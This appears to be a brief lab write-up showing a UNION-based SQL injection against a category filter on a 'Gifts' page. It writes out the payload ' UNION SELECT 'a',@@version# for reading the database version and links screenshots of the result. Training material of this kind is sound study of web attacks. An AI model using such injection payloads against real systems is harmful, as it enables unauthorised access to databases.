This is a vulnerable page which will be conduct SQL Injection attack by query

SELECT * FROM someTable WHERE category=Gifts


![image](https://user-images.githubusercontent.com/65653010/235273796-6e284c0d-3450-4b87-845a-422a339ab40b.png)

Therefore I need to inject ' UNION SELECT 'a',@@version# to obtain the version information with the following query: 

SELECT * FROM someTable WHERE category='Gifts' UNION SELECT 'a',@@version#'

![image](https://user-images.githubusercontent.com/65653010/235273802-bbd568a8-5862-4c10-8b73-f078ec8be4e4.png)

This results in this output on the page: 
![image](https://user-images.githubusercontent.com/65653010/235427045-9bbf1185-2b59-4995-8c57-567261c8e7db.png)
